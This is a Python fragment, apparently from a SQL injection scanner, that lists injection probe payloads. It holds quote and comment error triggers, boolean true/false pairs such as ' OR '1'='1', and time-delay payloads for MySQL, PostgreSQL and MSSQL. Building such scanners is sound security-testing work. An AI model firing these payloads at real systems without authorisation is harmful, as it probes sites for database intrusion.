ERROR_TESTS = [
    "'",
    "\"",
    "'--",
    "\"--",
    "')",
    "' OR '1'='1",
]

BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    (" AND 1=1", " AND 1=2"),
]

TIME_PAYLOADS = [
    ("'; SELECT SLEEP(5)--", 5, "mysql"),
    ("'; SELECT pg_sleep(5)--", 5, "postgres"),
    ("'; WAITFOR DELAY '0:0:5'--", 5, "mssql"),
]
